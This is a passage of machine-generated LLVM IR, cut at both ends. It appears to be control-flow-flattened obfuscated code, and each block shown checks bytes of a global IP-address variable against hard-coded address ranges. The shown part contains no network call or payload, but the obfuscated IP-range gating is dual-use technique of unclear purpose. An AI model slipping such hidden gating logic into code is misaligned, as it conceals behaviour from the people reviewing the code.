  br label %loopEnd

; <label>:1089:                                   ; preds = %loopEntry
  %1090 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1091 = zext i8 %1090 to i32
  %1092 = icmp slt i32 %1091, 50
  %1093 = select i1 %1092, i32 -886816699, i32 -1251895845
  store i32 %1093, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:1094:                                   ; preds = %loopEntry
  %1095 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1096 = zext i8 %1095 to i32
  %1097 = icmp eq i32 %1096, 164
  %1098 = select i1 %1097, i32 -115655256, i32 2116076994
  store i32 %1098, i32* %switchVar
  br label %loopEnd

; <label>:1099:                                   ; preds = %loopEntry
  %1100 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1101 = zext i8 %1100 to i32
  %1102 = icmp sge i32 %1101, 217
  %1103 = select i1 %1102, i32 -304737023, i32 2116076994
  store i32 %1103, i32* %switchVar
  br label %loopEnd

; <label>:1104:                                   ; preds = %loopEntry
  %1105 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1106 = zext i8 %1105 to i32
  %1107 = icmp slt i32 %1106, 233
  %1108 = select i1 %1107, i32 -886816699, i32 2116076994
  store i32 %1108, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:1109:                                   ; preds = %loopEntry
  %1110 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1111 = zext i8 %1110 to i32
  %1112 = icmp eq i32 %1111, 169
  %1113 = select i1 %1112, i32 173408786, i32 -705946399
  store i32 %1113, i32* %switchVar
  br label %loopEnd

; <label>:1114:                                   ; preds = %loopEntry
  %1115 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1116 = zext i8 %1115 to i32
  %1117 = icmp sge i32 %1116, 252
  %1118 = select i1 %1117, i32 -1761429237, i32 -705946399
  store i32 %1118, i32* %switchVar
  br label %loopEnd

; <label>:1119:                                   ; preds = %loopEntry
  %1120 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1121 = zext i8 %1120 to i32
  %1122 = icmp slt i32 %1121, 254
  %1123 = select i1 %1122, i32 -886816699, i32 -705946399
  store i32 %1123, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:1124:                                   ; preds = %loopEntry
  %1125 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1126 = zext i8 %1125 to i32
  %1127 = icmp eq i32 %1126, 199
  %1128 = select i1 %1127, i32 -486221456, i32 1828008340
  store i32 %1128, i32* %switchVar
  br label %loopEnd

; <label>:1129:                                   ; preds = %loopEntry
  %1130 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1131 = zext i8 %1130 to i32
  %1132 = icmp sge i32 %1131, 121
  %1133 = select i1 %1132, i32 -875696944, i32 1828008340
  store i32 %1133, i32* %switchVar
  br label %loopEnd

; <label>:1134:                                   ; preds = %loopEntry
  %1135 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1136 = zext i8 %1135 to i32
  %1137 = icmp slt i32 %1136, 254
  %1138 = select i1 %1137, i32 -886816699, i32 1828008340
  store i32 %1138, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:1139:                                   ; preds = %loopEntry
  %1140 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1141 = zext i8 %1140 to i32
  %1142 = icmp eq i32 %1141, 205
  %1143 = select i1 %1142, i32 -1809998463, i32 1079972815
  store i32 %1143, i32* %switchVar
  br label %loopEnd

; <label>:1144:                                   ; preds = %loopEntry
  %1145 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1146 = zext i8 %1145 to i32
  %1147 = icmp sge i32 %1146, 1
  %1148 = select i1 %1147, i32 -1873538394, i32 1079972815
  store i32 %1148, i32* %switchVar
  br label %loopEnd

; <label>:1149:                                   ; preds = %loopEntry
  %1150 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1151 = zext i8 %1150 to i32
  %1152 = icmp slt i32 %1151, 118
  %1153 = select i1 %1152, i32 -886816699, i32 1079972815
  store i32 %1153, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:1154:                                   ; preds = %loopEntry
  %1155 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1156 = zext i8 %1155 to i32
  %1157 = icmp eq i32 %1156, 207
  %1158 = select i1 %1157, i32 1209041077, i32 1010416355
  store i32 %1158, i32* %switchVar
  br label %loopEnd

; <label>:1159:                                   ; preds = %loopEntry
  %1160 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1161 = zext i8 %1160 to i32
  %1162 = icmp sge i32 %1161, 60
  %1163 = select i1 %1162, i32 30022712, i32 1010416355
  store i32 %1163, i32* %switchVar
  br label %loopEnd

; <label>:1164:                                   ; preds = %loopEntry
  %1165 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1166 = zext i8 %1165 to i32
  %1167 = icmp slt i32 %1166, 62
  %1168 = select i1 %1167, i32 -886816699, i32 1010416355
  store i32 %1168, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:1169:                                   ; preds = %loopEntry
  %1170 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1171 = zext i8 %1170 to i32
  %1172 = icmp eq i32 %1171, 104
  %1173 = select i1 %1172, i32 -731244280, i32 -2045577832
  store i32 %1173, i32* %switchVar
  br label %loopEnd

; <label>:1174:                                   ; preds = %loopEntry
  %1175 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1176 = zext i8 %1175 to i32
  %1177 = icmp sge i32 %1176, 16
  %1178 = select i1 %1177, i32 -2135888136, i32 -2045577832
  store i32 %1178, i32* %switchVar
  br label %loopEnd

; <label>:1179:                                   ; preds = %loopEntry
  %1180 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1181 = zext i8 %1180 to i32
  %1182 = icmp slt i32 %1181, 31
  %1183 = select i1 %1182, i32 -886816699, i32 -2045577832
  store i32 %1183, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:1184:                                   ; preds = %loopEntry
  %1185 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1186 = zext i8 %1185 to i32
  %1187 = icmp eq i32 %1186, 188
  %1188 = select i1 %1187, i32 474523298, i32 1203537454
  store i32 %1188, i32* %switchVar
  br label %loopEnd

; <label>:1189:                                   ; preds = %loopEntry
  %1190 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1191 = zext i8 %1190 to i32
  %1192 = icmp eq i32 %1191, 166
  %1193 = select i1 %1192, i32 -886816699, i32 1203537454
  store i32 %1193, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:1194:                                   ; preds = %loopEntry
  %1195 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1196 = zext i8 %1195 to i32
  %1197 = icmp eq i32 %1196, 188
  %1198 = select i1 %1197, i32 -445102806, i32 -1274249486
  store i32 %1198, i32* %switchVar
  br label %loopEnd

; <label>:1199:                                   ; preds = %loopEntry
  %1200 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1201 = zext i8 %1200 to i32
  %1202 = icmp eq i32 %1201, 226
  %1203 = select i1 %1202, i32 -886816699, i32 -1274249486
  store i32 %1203, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:1204:                                   ; preds = %loopEntry
  %1205 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1206 = zext i8 %1205 to i32
  %1207 = icmp eq i32 %1206, 159
  %1208 = select i1 %1207, i32 -263507504, i32 -486055727
  store i32 %1208, i32* %switchVar
  br label %loopEnd

; <label>:1209:                                   ; preds = %loopEntry
  %1210 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1211 = zext i8 %1210 to i32
  %1212 = icmp eq i32 %1211, 203
  %1213 = select i1 %1212, i32 -886816699, i32 -486055727
  store i32 %1213, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:1214:                                   ; preds = %loopEntry
  %1215 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1216 = zext i8 %1215 to i32
  %1217 = icmp eq i32 %1216, 162
  %1218 = select i1 %1217, i32 -1904575356, i32 -380393543
  store i32 %1218, i32* %switchVar
  br label %loopEnd

; <label>:1219:                                   ; preds = %loopEntry
  %1220 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1221 = zext i8 %1220 to i32
  %1222 = icmp eq i32 %1221, 243
  %1223 = select i1 %1222, i32 -886816699, i32 -380393543
  store i32 %1223, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:1224:                                   ; preds = %loopEntry
  %1225 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1226 = zext i8 %1225 to i32
  %1227 = icmp eq i32 %1226, 45
  %1228 = select i1 %1227, i32 -1032226186, i32 -2045322435
  store i32 %1228, i32* %switchVar
  br label %loopEnd

; <label>:1229:                                   ; preds = %loopEntry
  %1230 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1231 = zext i8 %1230 to i32
  %1232 = icmp eq i32 %1231, 55
  %1233 = select i1 %1232, i32 -886816699, i32 -2045322435
  store i32 %1233, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:1234:                                   ; preds = %loopEntry
  %1235 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1236 = zext i8 %1235 to i32
  %1237 = icmp eq i32 %1236, 178
  %1238 = select i1 %1237, i32 1586155088, i32 1690116599
  store i32 %1238, i32* %switchVar
  br label %loopEnd

; <label>:1239:                                   ; preds = %loopEntry
  %1240 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1241 = zext i8 %1240 to i32
  %1242 = icmp eq i32 %1241, 62
  %1243 = select i1 %1242, i32 -886816699, i32 1690116599
  store i32 %1243, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:1244:                                   ; preds = %loopEntry
  %1245 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1246 = zext i8 %1245 to i32
  %1247 = icmp eq i32 %1246, 104
  %1248 = select i1 %1247, i32 -1939109746, i32 -752471685
  store i32 %1248, i32* %switchVar
  br label %loopEnd

; <label>:1249:                                   ; preds = %loopEntry
  %1250 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1251 = zext i8 %1250 to i32
  %1252 = icmp eq i32 %1251, 131
  %1253 = select i1 %1252, i32 -886816699, i32 -752471685
  store i32 %1253, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:1254:                                   ; preds = %loopEntry
  %1255 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1256 = zext i8 %1255 to i32
  %1257 = icmp eq i32 %1256, 104
  %1258 = select i1 %1257, i32 -1394664013, i32 1757176164
  store i32 %1258, i32* %switchVar
  br label %loopEnd

; <label>:1259:                                   ; preds = %loopEntry
  %1260 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1261 = zext i8 %1260 to i32
  %1262 = icmp eq i32 %1261, 236
  %1263 = select i1 %1262, i32 -886816699, i32 1757176164
  store i32 %1263, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:1264:                                   ; preds = %loopEntry
  %1265 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1266 = zext i8 %1265 to i32
  %1267 = icmp eq i32 %1266, 107
  %1268 = select i1 %1267, i32 1185894644, i32 1849122939
  store i32 %1268, i32* %switchVar
  br label %loopEnd

; <label>:1269:                                   ; preds = %loopEntry
  %1270 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1271 = zext i8 %1270 to i32
  %1272 = icmp eq i32 %1271, 170
  %1273 = select i1 %1272, i32 -886816699, i32 1849122939
  store i32 %1273, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:1274:                                   ; preds = %loopEntry
  %1275 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1276 = zext i8 %1275 to i32
  %1277 = icmp eq i32 %1276, 138
  %1278 = select i1 %1277, i32 -2125651257, i32 1969915263
  store i32 %1278, i32* %switchVar
  br label %loopEnd

; <label>:1279:                                   ; preds = %loopEntry
  %1280 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1281 = zext i8 %1280 to i32
  %1282 = icmp eq i32 %1281, 197
  %1283 = select i1 %1282, i32 -886816699, i32 1969915263
  store i32 %1283, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:1284:                                   ; preds = %loopEntry
  %1285 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1286 = zext i8 %1285 to i32
  %1287 = icmp eq i32 %1286, 138
  %1288 = select i1 %1287, i32 -779956737, i32 1464975735
  store i32 %1288, i32* %switchVar
  br label %loopEnd

; <label>:1289:                                   ; preds = %loopEntry
  %1290 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1291 = zext i8 %1290 to i32
  %1292 = icmp eq i32 %1291, 68
  %1293 = select i1 %1292, i32 -886816699, i32 1464975735
  store i32 %1293, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:1294:                                   ; preds = %loopEntry
  %1295 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1296 = zext i8 %1295 to i32
  %1297 = icmp eq i32 %1296, 139
  %1298 = select i1 %1297, i32 -800524230, i32 2095014533
  store i32 %1298, i32* %switchVar
  br label %loopEnd

; <label>:1299:                                   ; preds = %loopEntry
  %1300 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1301 = zext i8 %1300 to i32
  %1302 = icmp eq i32 %1301, 59
  %1303 = select i1 %1302, i32 -886816699, i32 2095014533
  store i32 %1303, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:1304:                                   ; preds = %loopEntry
  %1305 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1306 = zext i8 %1305 to i32
  %1307 = icmp eq i32 %1306, 146
  %1308 = select i1 %1307, i32 -44045216, i32 664916710
  store i32 %1308, i32* %switchVar
  br label %loopEnd

; <label>:1309:                                   ; preds = %loopEntry
  %1310 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1311 = zext i8 %1310 to i32
  %1312 = icmp eq i32 %1311, 185
  %1313 = select i1 %1312, i32 -298260218, i32 664916710
  store i32 %1313, i32* %switchVar
  br label %loopEnd

; <label>:1314:                                   ; preds = %loopEntry
  %1315 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1316 = zext i8 %1315 to i32
  %1317 = icmp sge i32 %1316, 128
  %1318 = select i1 %1317, i32 -1494540393, i32 664916710
  store i32 %1318, i32* %switchVar
  br label %loopEnd

; <label>:1319:                                   ; preds = %loopEntry
  %1320 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1321 = zext i8 %1320 to i32
  %1322 = icmp slt i32 %1321, 191
  %1323 = select i1 %1322, i32 -886816699, i32 664916710
  store i32 %1323, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:1324:                                   ; preds = %loopEntry
  %1325 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1326 = zext i8 %1325 to i32
  %1327 = icmp eq i32 %1326, 163
  %1328 = select i1 %1327, i32 -1103388547, i32 -1647182814
  store i32 %1328, i32* %switchVar
  br label %loopEnd

; <label>:1329:                                   ; preds = %loopEntry
  %1330 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1331 = zext i8 %1330 to i32
  %1332 = icmp eq i32 %1331, 47
  %1333 = select i1 %1332, i32 -717805440, i32 -1647182814
  store i32 %1333, i32* %switchVar
  br label %loopEnd

; <label>:1334:                                   ; preds = %loopEntry
  %1335 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1336 = zext i8 %1335 to i32
  %1337 = icmp sge i32 %1336, 10
  %1338 = select i1 %1337, i32 1652267575, i32 -1647182814
  store i32 %1338, i32* %switchVar
  br label %loopEnd

; <label>:1339:                                   ; preds = %loopEntry
  %1340 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1341 = zext i8 %1340 to i32
  %1342 = icmp slt i32 %1341, 11
  %1343 = select i1 %1342, i32 -886816699, i32 -1647182814
  store i32 %1343, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:1344:                                   ; preds = %loopEntry
  %1345 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1346 = zext i8 %1345 to i32
  %1347 = icmp eq i32 %1346, 174
  %1348 = select i1 %1347, i32 38224213, i32 691283573
  store i32 %1348, i32* %switchVar
  br label %loopEnd

; <label>:1349:                                   ; preds = %loopEntry
  %1350 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1351 = zext i8 %1350 to i32
  %1352 = icmp eq i32 %1351, 138
  %1353 = select i1 %1352, i32 1163992980, i32 691283573
  store i32 %1353, i32* %switchVar
  br label %loopEnd

; <label>:1354:                                   ; preds = %loopEntry
  %1355 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1356 = zext i8 %1355 to i32
  %1357 = icmp sge i32 %1356, 1
  %1358 = select i1 %1357, i32 -1317957553, i32 691283573
  store i32 %1358, i32* %switchVar
  br label %loopEnd

; <label>:1359:                                   ; preds = %loopEntry
  %1360 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1361 = zext i8 %1360 to i32
  %1362 = icmp slt i32 %1361, 127
  %1363 = select i1 %1362, i32 -886816699, i32 691283573
  store i32 %1363, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:1364:                                   ; preds = %loopEntry
  %1365 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1366 = zext i8 %1365 to i32
  %1367 = icmp eq i32 %1366, 192
  %1368 = select i1 %1367, i32 -1327385528, i32 -1767036477
  store i32 %1368, i32* %switchVar
  br label %loopEnd

; <label>:1369:                                   ; preds = %loopEntry
  %1370 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1371 = zext i8 %1370 to i32
  %1372 = icmp eq i32 %1371, 241
  %1373 = select i1 %1372, i32 -902004387, i32 -1767036477
  store i32 %1373, i32* %switchVar
  br label %loopEnd

; <label>:1374:                                   ; preds = %loopEntry
  %1375 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1376 = zext i8 %1375 to i32
  %1377 = icmp sge i32 %1376, 128
  %1378 = select i1 %1377, i32 -965122475, i32 -1767036477
  store i32 %1378, i32* %switchVar
  br label %loopEnd

; <label>:1379:                                   ; preds = %loopEntry
  %1380 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1381 = zext i8 %1380 to i32
  %1382 = icmp slt i32 %1381, 255
  %1383 = select i1 %1382, i32 -886816699, i32 -1767036477
  store i32 %1383, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:1384:                                   ; preds = %loopEntry
  %1385 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1386 = zext i8 %1385 to i32
  %1387 = icmp eq i32 %1386, 198
  %1388 = select i1 %1387, i32 -744702819, i32 -1040516172
  store i32 %1388, i32* %switchVar
  br label %loopEnd

; <label>:1389:                                   ; preds = %loopEntry
  %1390 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1391 = zext i8 %1390 to i32
  %1392 = icmp eq i32 %1391, 199
  %1393 = select i1 %1392, i32 -1140227698, i32 -1040516172
  store i32 %1393, i32* %switchVar
  br label %loopEnd

; <label>:1394:                                   ; preds = %loopEntry
  %1395 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1396 = zext i8 %1395 to i32
  %1397 = icmp sge i32 %1396, 64
  %1398 = select i1 %1397, i32 -435199163, i32 -1040516172
  store i32 %1398, i32* %switchVar
  br label %loopEnd

; <label>:1399:                                   ; preds = %loopEntry
  %1400 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1401 = zext i8 %1400 to i32
  %1402 = icmp slt i32 %1401, 127
  %1403 = select i1 %1402, i32 -886816699, i32 -1040516172
  store i32 %1403, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:1404:                                   ; preds = %loopEntry
  %1405 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1406 = zext i8 %1405 to i32
  %1407 = icmp eq i32 %1406, 198
  %1408 = select i1 %1407, i32 788159576, i32 -327043017
  store i32 %1408, i32* %switchVar
  br label %loopEnd

; <label>:1409:                                   ; preds = %loopEntry
  %1410 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1411 = zext i8 %1410 to i32
  %1412 = icmp eq i32 %1411, 211
  %1413 = select i1 %1412, i32 830725550, i32 -327043017
  store i32 %1413, i32* %switchVar
  br label %loopEnd

; <label>:1414:                                   ; preds = %loopEntry
  %1415 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1416 = zext i8 %1415 to i32
  %1417 = icmp sge i32 %1416, 96
  %1418 = select i1 %1417, i32 -423772671, i32 -327043017
  store i32 %1418, i32* %switchVar
  br label %loopEnd

; <label>:1419:                                   ; preds = %loopEntry
  %1420 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1421 = zext i8 %1420 to i32
  %1422 = icmp slt i32 %1421, 127
  %1423 = select i1 %1422, i32 -886816699, i32 -327043017
  store i32 %1423, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:1424:                                   ; preds = %loopEntry
  %1425 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1426 = zext i8 %1425 to i32
  %1427 = icmp eq i32 %1426, 207
  %1428 = select i1 %1427, i32 1702657016, i32 -552228615
  store i32 %1428, i32* %switchVar
  br label %loopEnd

; <label>:1429:                                   ; preds = %loopEntry
  %1430 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1431 = zext i8 %1430 to i32
  %1432 = icmp eq i32 %1431, 154
  %1433 = select i1 %1432, i32 1984906311, i32 -552228615
  store i32 %1433, i32* %switchVar
  br label %loopEnd

; <label>:1434:                                   ; preds = %loopEntry
  %1435 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1436 = zext i8 %1435 to i32
  %1437 = icmp sge i32 %1436, 192
  %1438 = select i1 %1437, i32 1357905022, i32 -552228615
  store i32 %1438, i32* %switchVar
  br label %loopEnd

; <label>:1439:                                   ; preds = %loopEntry
  %1440 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1441 = zext i8 %1440 to i32
  %1442 = icmp slt i32 %1441, 255
  %1443 = select i1 %1442, i32 -886816699, i32 -552228615
  store i32 %1443, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:1444:                                   ; preds = %loopEntry
  %1445 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1446 = zext i8 %1445 to i32
  %1447 = icmp eq i32 %1446, 37
  %1448 = select i1 %1447, i32 -1136152305, i32 1321848837
  store i32 %1448, i32* %switchVar
  br label %loopEnd

; <label>:1449:                                   ; preds = %loopEntry
  %1450 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1451 = zext i8 %1450 to i32
  %1452 = icmp eq i32 %1451, 139
  %1453 = select i1 %1452, i32 1363143455, i32 1321848837
  store i32 %1453, i32* %switchVar
  br label %loopEnd

; <label>:1454:                                   ; preds = %loopEntry
  %1455 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1456 = zext i8 %1455 to i32
  %1457 = icmp sge i32 %1456, 1
  %1458 = select i1 %1457, i32 -1932833625, i32 1321848837
  store i32 %1458, i32* %switchVar
  br label %loopEnd

; <label>:1459:                                   ; preds = %loopEntry
  %1460 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1461 = zext i8 %1460 to i32
  %1462 = icmp slt i32 %1461, 31
  %1463 = select i1 %1462, i32 -886816699, i32 1321848837
  store i32 %1463, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:1464:                                   ; preds = %loopEntry
  %1465 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1466 = zext i8 %1465 to i32
  %1467 = icmp eq i32 %1466, 67
  %1468 = select i1 %1467, i32 -375103864, i32 1605081818
  store i32 %1468, i32* %switchVar
  br label %loopEnd

; <label>:1469:                                   ; preds = %loopEntry
  %1470 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1471 = zext i8 %1470 to i32
  %1472 = icmp eq i32 %1471, 207
  %1473 = select i1 %1472, i32 -11073439, i32 1605081818
  store i32 %1473, i32* %switchVar
  br label %loopEnd

; <label>:1474:                                   ; preds = %loopEntry
  %1475 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1476 = zext i8 %1475 to i32
  %1477 = icmp sge i32 %1476, 64
  %1478 = select i1 %1477, i32 -1230743145, i32 1605081818
  store i32 %1478, i32* %switchVar
  br label %loopEnd

; <label>:1479:                                   ; preds = %loopEntry
  %1480 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1481 = zext i8 %1480 to i32
  %1482 = icmp slt i32 %1481, 95
  %1483 = select i1 %1482, i32 -886816699, i32 1605081818
  store i32 %1483, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:1484:                                   ; preds = %loopEntry
  %1485 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
